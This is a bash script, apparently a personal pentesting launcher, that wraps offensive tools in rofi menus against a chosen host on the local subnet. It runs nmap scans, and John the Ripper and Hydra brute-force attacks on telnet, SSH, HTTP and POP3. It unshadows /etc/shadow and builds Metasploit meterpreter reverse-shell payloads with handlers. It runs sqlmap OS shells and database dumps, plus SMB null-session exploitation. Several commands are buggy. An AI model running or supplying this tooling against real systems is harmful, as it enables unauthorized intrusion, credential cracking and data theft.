#!/bin/bash
while true; do
	interface=$(ifconfig | cut -d ":" -f 1 | cut -d " " -f 1 | sed '/^$/d' | grep -v 'lo' | rofi -dmenu -theme DarkBlue -p "Which interface do you want to use?" )
	myip=$(ifconfig "$interface" | grep -win 'inet' | cut -d " " -f 10)
	range=$(ifconfig "$interface" | grep -win 'inet' | cut -d " " -f 10 | cut -d "." -f 1-3 | tr -d '\n' && echo ".0/24")
	while true; do
		whosup=$(nmap -sn -T5 -min-parallelism 100 "$range" | grep -v -E 'Host|done|Starting' | cut -d " " -f 5 | grep -vxF "$myip" | sed '/^$/d' )
		scan=$(echo "$whosup" | tr " " "\n" | rofi -dmenu -theme DarkBlue -p "What IP would you like to use?")

		while true; do
			syntax=$(echo -e "1.  Nmap\n2.  Password Cracking\n3.  Reverse Shell\n4.  SQLMap (Under Construction)\n5.  Dirb\n6.  Windows Shares/Null Sessions\n7.  Change Target IP\n8.  Change Selected Interface\n9.  Exit" | rofi -dmenu -theme DarkBlue -p "What Program are you interested in?"| cut -d '.' -f 1)

			if [[ $syntax == "1" ]]; then
				
				while true; do
					nmapscan=$(echo -e  "1. Stealth Scan\n2. Quick Scan\n3. Full Scan\n4. UDP Quick Scan\n5. Full Scan+\n6. Is Someone Listening?\n7. Port Knocker\n8. Back\n9. Exit" | rofi -dmenu -theme DarkBlue -p "What type of nmap scan would you like to use?" | cut -d '.' -f 1)
					
					if [[ $nmapscan == "1" ]]; then
						sudo mkdir -p "NmapScans/$scan/StealthScan"
						sudo nmap -T1 -sS "$scan" -oX  "NmapScans/$scan/StealthScan/$scan.xml"
						sudo xsltproc "NmapScans/$scan/StealthScan/$scan.xml" -o "NmapScans/$scan/StealthScan/$scan.html"
						sudo rm -f "NmapScans/$scan/StealthScan/$scan.xml"

					elif [[ $nmapscan == "2" ]]; then
						sudo mkdir -p "NmapScans/$scan/QuickScan"
						sudo nmap -sC -sV "$scan" -oX  "NmapScans/$scan/QuickScan/$scan.xml"
						sudo xsltproc "NmapScans/$scan/QuickScan/$scan.xml" -o "NmapScans/$scan/QuickScan/$scan.html"
						sudo rm -f "NmapScans/$scan/QuickScan/$scan.xml"
					
					elif [[ $nmapscan == "3" ]]; then
						sudo mkdir -p "NmapScans/$scan/FullScan"
						sudo nmap -sC -sV -p- "$scan" -oX  "NmapScans/$scan/FullScan/$scan.xml"
						sudo xsltproc "NmapScans/$scan/FullScan/$scan.xml" -o "NmapScans/$scan/FullScan/$scan.html"
						sudo rm -f "NmapScans/$scan/FullScan/$scan.xml"

					elif [[ $nmapscan == "4" ]]; then
						sudo mkdir -p "NmapScans/$scan/QuickUDP"
						sudo nmap -sU -sV "$scan" -oX  "NmapScans/$scan/QuickUDP/$scan.xml"
						sudo xsltproc "NmapScans/$scan/QuickUDP/$scan.xml" -o "NmapScans/$scan/QuickUDP/$scan.html"
						sudo rm -f "NmapScans/$scan/QuickUDP/$scan.xml"

					elif [[ $nmapscan == "5" ]]; then
						sudo mkdir -p "NmapScans/$scan/FullScan+"
						sudo nmap -sV -n -v -Pn -p- -T4 -A "$scan" -oX "NmapScans/$scan/FullScan+/$scan.xml"
						sudo xsltproc "NmapScans/$scan/FullScan+/$scan.xml" -o "NmapScans/$scan/FullScan+/$scan.html"
						sudo rm -f "NmapScans/$scan/FullScan+/$scan.xml"

					elif [[ $nmapscan == "6" ]]; then
						sudo mkdir -p "NmapScans/$scan/SomeoneListening"
						sudo nmap -sV --script=sniffer-detect "$scan"
					
					elif [[ $nmapscan == "7" ]]; then
						port=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Port Number

						");

						sudo nmap -Pn --host-timeout 100 --max-retries 0 -p "$port" "$scan" 


					elif [[ $nmapscan == "8" ]]; then
						break
					elif [[ $nmapscan == "9" ]]; then
						exit   
					fi


				done


			elif [[ $syntax == "2" ]]; then
				while true; do
					passcracker=$(echo -e "1. John\n2. Hydra\n3. Back\n4. Exit" | rofi -dmenu -theme DarkBlue -p "Which password cracking tool would you like to use?" | cut -d '.' -f 1)
					if [[ $passcracker == "1" ]]; then
						while true; do
							userlist=$(find /usr/share/ncrack/* /usr/share/seclists/Usernames/* -name '*.txt' -o -name '*.usr' | sort |rofi -dmenu -theme DarkBlue -p "Which Username List would you like to use?")
							passlist=$(find /usr/share/ncrack/* /usr/share/seclists/Passwords/* -name '*.txt' -o -name '*.usr' | sort | rofi -dmenu -theme DarkBlue -p "Which Password List would you like to use?")
							while true; do
								john=$(echo -e  "1.  Encryption Formats\n2.  Unshadow\n3.  Brute Force Users List\n4.  Brute Force Single User((Not Complete)\n5.  Show Cracked Passwords\n6.  Dictionary Attack\n7.  Default Wordlist\n8.  Mangled Rules\n9.  Crack Cisco Secret 5\n10. Change User & Pass List\n11. Back\n12. Exit" | rofi -dmenu -theme DarkBlue -p "Which John The Ripper Attack would you like to use?" | cut -d '.' -f 1)
								
								if [[ $john == "1" ]]; then
									sudo john --list=formats
								elif [[ $john == "2" ]]; then
									sudo unshadow /etc/passwd /etc/shadow > hashes.txt
								elif [[ $john == "3" ]]; then
									sudo john -incremental -users:"$userlist" -wordlist="$passlist"
								elif [[ $john == "4" ]]; then
									
									victim=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter a user(s) ex: User1, User2


								");
									sudo john -incremental -users:"$victim"
								elif [[ $john == "5" ]]; then
									sudo john --show hashes.txt
								elif [[ $john == "6" ]]; then
									sudo john -wordlist="$passlist" hashes.txt
								elif [[ $john == "7" ]]; then
									victim=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter a user(s) ex: User1, User2


								");
							
									sudo john -wordlist -users="$victim" hashes.txt
								elif [[ $john == "8" ]]; then
									sudo john -wordlist="$passlist" -rules hashes.txt
								elif [[ $john == "9" ]]; then
									sudo john --format=md5crypt --fork=4 -wordlist="$passlist" hashes.txt
								elif [[ $john == "10" ]]; then
									break	
								elif [[ $john == "11" ]]; then
									break 2
								elif [[ $john == "12" ]]; then
									exit   
								fi
							done
						done

					elif [[ $passcracker == "2" ]]; then
						while true; do	
							userlist=$(find /usr/share/ncrack/* /usr/share/seclists/Usernames/* -name '*.txt' -o -name '*.usr' | sort | rofi -dmenu -theme DarkBlue -p "Which Username List would you like to use?")
							passlist=$(find /usr/share/ncrack/* /usr/share/seclists/Passwords/* -name '*.txt' -o -name '*.usr' | sort | rofi -dmenu -theme DarkBlue -p "Which Password List would you like to use
							");
							##port=$(sudo nmap -T5 -min-parallelism 100 -p- $scan | cut -d " " -f 1 | sed 's/[^0-9]*//g' | sed '/^$/d'| rofi -dmenu -theme DarkBlue -p "What port would you like to use?" | cut -d '.' -f 1)

							while true; do	
								hydra=$(echo -e  "1. Telnet Crack\n2. HTTP Basic Auth Attack\n3. SSH Crack 2\n4. Login Crack\n5. PoP3 Crack\n6. Change User & Pass List\n7. Back\n8. Exit" | rofi -dmenu -theme DarkBlue -p "Which Hydra Attack would you like to use?" | cut -d '.' -f 1)

								if [[ $hydra == "1" ]]; then
									echo -e "sudo hydra -L $userlist -P $passlist telnet://$scan\n"
									sudo hydra -L "$userlist" -P "$passlist" -s"$port" telnet://"$scan"
								
								elif [[ $hydra == "2" ]]; then
									url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste your URL

									");

									echo -e "sudo hydra -L $userlist -P $passlist http-get://$url\n"
									sudo hydra -L "$userlist" -P -s"$port" "$passlist" http-get://"$url"
								
								elif [[ $hydra == "3" ]]; then
									echo -e "sudo hydra $scan ssh -L $userlist -P $passlist -f -V\n"
									sudo hydra "$scan" ssh -s22 -L "$userlist" -P "$passlist" -f -V
								
								elif [[ $hydra == "4" ]]; then

									url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste your URL

									");
									rname=$(echo "$url" | cut -d "/" -f 3);
									fpath=$(echo "$url" | cut -d "/" -f 4-99);



									echo -e "sudo hydra $rname http-post-form $fpath':usr=^USER^&pwd=^PASS^:invalid credentials' -L $user -P $passlist -f -V\n"
									sudo hydra "$rname" http-post-form '$fpath:usr=^USER^&pwd=^PASS^:invalid credentials' -L "$user" -P "$passlist" -f -V

								elif [[ $hydra == "5" ]]; then
									
									UserQuestion=$(echo -e  "Yes\nNo" | rofi -dmenu -theme DarkBlue -p "Do you know the Username?")
									if [[ $UserQuestion == "Yes" ]]; then 
										user=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Username:


						");



										echo -e "sudo hydra -l $user -P $passlist -t20 $scan -s$port -I pop3\n"
										sudo hydra -l "$user" -P "$passlist" -t20 "$scan" -s"$port" -I pop3

									elif [[ $UserQuestion == "No" ]]; then 

										echo -e "sudo hydra -L $userlist-P $passlist -t20 $scan -s$port -I pop3\n"
										sudo hydra -L "$userlist" -P "$passlist" -t20 "$scan" -s"$port" -I pop3



									fi
									
								elif [[ $hydra == "6" ]]; then
									break
								elif [[ $hydra == "7" ]]; then
									break 2
								elif [[ $hydra == "8" ]]; then
									exit   

									
						
							fi
							done
						done	
					elif [[ $passcracker == "3" ]]; then
						break
					elif [[ $passcracker == "4" ]]; then
						exit   


					fi

				done	
			elif [[ $syntax == "3" ]]; then
				while true; do
					reverseshell=$(echo -e "1. PHP Reverse Shell\n2. Linux Reverse Shell\n3. Tomcat Reverse Shell\n4. Back\n5. Exit" | rofi -dmenu -theme DarkBlue -p "Which Reverse Shell would you like to use?" | cut -d '.' -f 1)
					##PHP Reverse Shell
					if [[ $reverseshell == "1" ]]; then
						msfvenom -p php/meterpreter_reverse_tcp lhost=127.0.0.1 lport=443 -o shell.php
						sleep 3
						msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set payload php/meterpreter_reverse_tcp; run; exit -y"
					
					##Linux Reverse Shell
					elif [[ $reverseshell == "2" ]]; then
						port=$(sudo nmap -sS -p- "$scan" | cut -d " " -f 1 | sed 's/[^0-9]*//g' | sed '/^$/d'| rofi -dmenu -theme DarkBlue -p "What Port would you like to use?" | cut -d '.' -f 1)
						msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=127.0.0.1 lport="$port" -o shell  
						sleep 3
						msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"
					
					##Tomcat Reverse Shell
					elif [[ $reverseshell == "3" ]]; then
						port=$(sudo nmap -sS -p- "$scan" | cut -d " " -f 1 | sed 's/[^0-9]*//g' | sed '/^$/d' | rofi -dmenu -theme DarkBlue -p "Which Port would you like to use?" | cut -d '.' -f 1)
						msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=127.0.0.1 lport="$port" -f elf -o shell.war 
						sleep 3
						msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"
					
					##Back
					elif [[ $reverseshell == "4" ]]; then
						break
					
					##Exit
					elif [[ $reverseshell == "5" ]]; then
						exit


					fi
				done



			elif [[ "$syntax" == "4" ]]; then
				while true; do
					sqlmaps=$(echo -e "1.  Interactive Shell\n2.  Get Request\n3.  Post Request\n4.  Banner Grab\n5.  Payloads Used\n6.  Find Users\n7.  Show Databases\n8.  Show Tables\n9.  Show Columns\n10. Dump Database\n11. Burp Output(NOT WORKING)\n12. Back\n13. Exit" | rofi -dmenu -theme DarkBlue -p "Which SQLMap Command would you like to use?" | cut -d '.' -f 1)
					
					##Interactive Shell
					if [[ $sqlmaps == "1" ]]; then
						url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");

						sqlmap -u "$url" --os-shell


					##Get Request	
					elif [[ $sqlmaps == "2" ]]; then
						url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap -o -u "$url" -p "$id" --technique=U

						else
							sqlmap -o -u "$url" --forms

						fi

					##Post Request	
					elif [[ $sqlmaps == "3" ]]; then
						url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap -o -u "$url" --data=POSTstring -p "$id"
						
						else
							sqlmap -o -u "$url" --forms --data=POSTstring 

						fi

					##Banner Grab	
					elif [[ $sqlmaps == "4" ]]; then
						url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap -o -u "$url" -p "$id" --technique=U --banner
					
						else
							sqlmap -o -u "$url" --forms --banner

						fi
						
					##Payloads Used
					elif [[ $sqlmaps == "5" ]]; then
						url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap -o -u "$url" -p "$id" --technique=U --banner -v3 --fresh-queries
						
						else
							sqlmap -o -u "$url" --forms --banner -v3 --fresh-queries

						fi


					##Find Users
					elif [[ $sqlmaps == "6" ]]; then
						url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap -o -u "$url" -p "$id" --technique=u -users

						else
							sqlmap -o -u "$url" --forms -users

						fi
					
					
					##Show Database
					elif [[ $sqlmaps == "7" ]]; then
						url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
						
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							sqlmap -o -u "$url" -p "$id" --technique=u -dbs
			
						else
							sqlmap -o -u "$url" --forms -dbs
						
						fi
					
					
					##Show Tables
					elif [[ $sqlmaps == "8" ]]; then
						url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
	
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							db=$(sqlmap -o -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -theme DarkBlue -p "Select Database use 

				");

							sqlmap -o -u "$url" -p "$id" --technique=U -D "$db" -tables
			
						else
							db=$(sqlmap -o -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -theme DarkBlue -p "Select Database use 

				");

							sqlmap -o  -u "$url" --forms -D "$db" -tables

							

						fi

					##Show Columns
					elif [[ $sqlmaps == "9" ]]; then
						url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
	
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
							db=$(sqlmap -o -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -theme DarkBlue -p "Select a Database 

						");

							Tables=$(sqlmap -o -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -theme DarkBlue -p "Select a Table
										
						");
							sqlmap -o -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" -columns
						else
							db=$(sqlmap -o -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -theme DarkBlue -p "Select a Database 

						");

							Tables=$(sqlmap -o -u "$url" --forms -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -theme DarkBlue -p "Select a Table
										
						");
							sqlmap -o -u "$url" --forms -D "$db" -T "$Tables" -columns


						fi
						
					##Dump Databases
					elif [[ $sqlmaps == "10" ]]; then
						url=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


						");
						index="="
	
						if grep -q "$index" <<< "$url"; then
							id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1) 
							db=$(sqlmap -o -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -theme DarkBlue -p "Select a Database 

						");

							Tables=$(sqlmap -o -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | greP -vE '([+]*[+])' | rofi -dmenu -theme DarkBlue -p "Select a Table	
										
						");


							Columns=$(sqlmap -o -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" --columns | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | tail -n +2)
						
							echo "$Columns"
							sleep 1

							Data=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Columns to Dump
	***Enter More than 1 with a comma***NO SPACES****
						
	$Columns	


						");


							sqlmap -o -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" -C "$Data" --dump
						
						else
							db=$(sqlmap -o -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -theme DarkBlue -p "Select a Database 

						");

							Tables=$(sqlmap -o -u "$url" --forms -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | greP -vE '([+]*[+])' | rofi -dmenu -theme DarkBlue -p "Select a Table	
										
						");


							Columns=$(sqlmap -o -u "$url" --forms -D "$db" -T "$Tables" --columns | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | tail -n +2)
						
							echo "$Columns"
							sleep 1

							Data=$(echo "" | rofi -dmenu  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Columns to Dump
	***Enter More than 1 with a comma***NO SPACES****
						
	$Columns	


						");


							sqlmap -o -u "$url" --forms -D "$db" -T "$Tables" -C "$Data" --dump

						fi
				
					##Burp Output (NOT WORKING)
					elif [[ $sqlmaps == "11" ]]; then
						file=$(find ./* -name '*.txt' | sort | rofi -dmenu -theme DarkBlue -p "Choose the file you want to use: This should be file you made from a burp output page")
						sqlmap -r "$file" — dbs — level 3

					##BACK
					elif [[ $sqlmaps == "12" ]]; then
						break
					##EXIT
					elif [[ $sqlmaps == "13" ]]; then
						exit
					fi
				done

			#DIRB
			elif [[ $syntax == "5" ]]; then
				while true; do
					dirb=$(echo -e "1.  Default Directory list\n2.  Choose a Directory List\n3.  Add File Extentions .php .old and .bak\n4.  Back\n5.  Exit" | rofi -dmenu -theme DarkBlue -p "Which Dirb Command would you like to use?" | cut -d '.' -f 1)
					###Default Directory List
					if [[ $dirb == "1" ]]; then
						dirb http://"$scan"
					
					###Choose Directory List
					elif [[ $dirb == "2" ]]; then
						dirlist=$(find /usr/share/dirb/wordlists/* /usr/share/dirbuster/wordlists/* -name '*.txt' | sort | rofi -dmenu -theme DarkBlue -p "Which Password List would you like to use?")
						dirb http://"$scan" "$dirlist" -w
					
					##Add File Extention
					elif [[ $dirb == "3" ]]; then
						dirlist=$(find /usr/share/dirb/wordlists/* /usr/share/dirbuster/wordlists/* -name '*.txt' | sort | rofi -dmenu -theme DarkBlue -p "Which Password List would you like to use?")
						dirb http://"$scan" "$dirlist" -w -X '.php,.old,.bak'
				
					##BACK
					elif [[ $dirb == "4" ]]; then
						break

					##EXIT
					elif [[ $dirb == "5" ]]; then
						exit
					fi
				done


			#NULL SESSIONS
			elif [[ "$syntax" == "6" ]]; then
				while true; do
					nullsession=$(echo -e "1.  nblookup/netstat\n2.  Password Policy Info\n3.  Enumerate Shares List\n4.  Enumerate Users List\n5.  Do All Above at once\n6.  Brute Forces Users\n7.  Service Available\n8.  Force no Pass\n9.  Exploit Null Sessions\n10. No Pass or User\n11. Not sure yet\n12. Back\n13. Exit" | rofi -dmenu -theme DarkBlue -p "Which SQLMap Command would you like to use?" | cut -d '.' -f 1)
					
					##NbLookup/Netstat
					if [[ $nullsession == "1" ]]; then
						enum4linux -n "$scan"

					##Password Policy
					elif [[ $nullsession == "2" ]]; then
						enum4linux -P "$scan"
					
					##Enumerate Shares Liss
					elif [[ $nullsession == "3" ]]; then
						enum4linux -S "$scan"
					
					##Enumerate Users List
					elif [[ $nullsession == "4" ]]; then
						enum4linux -U "$scan"
					
					##Do Everything Above at once
					elif [[ $nullsession == "5" ]]; then
						enum4linux -a "$scan"
					
					##Brute Force Users
					elif [[ $nullsession == "6" ]]; then
						enum4linux -s /usr/share/enum4linux/share-list.txt "$scan"
					
					##Service Available
					elif [[ $nullsession == "7" ]]; then
						smbclient -L //"$scan"

					##Force No Pass
					elif [[ $nullsession == "8" ]]; then
						smbclient -L //"$scan" -N

					##Exploit Null Session	
					elif [[ $nullsession == "9" ]]; then
						smbclient //"$scan"/IPC$ -N
					
					##No Pass/User
					elif [[ $nullsession == "10" ]]; then
						smbclient -L WORKGROUP -i "$scan" -N -U ' '
					
					#Not Sure
					elif [[ $nullsession == "11" ]]; then
						smbclient \\\\\\\\\\\\"$scan"\\\\\\WorkSharing -N
					
					##BACK	
					elif [[ $nullsession == "12" ]]; then
						break

					##EXIT
					elif [[ $nullsession == "13" ]]; then
						exit


					fi
				done
			

			#Change IP ADDRESS
			elif [[ "$syntax" == "7" ]]; then
				break
			
			#Change InterFace	
			elif [[ "$syntax" == "8" ]]; then
				break 2
			#Exit 
			elif [[ "$syntax" == "9" ]]; then
				exit

			fi
		done
	done
done
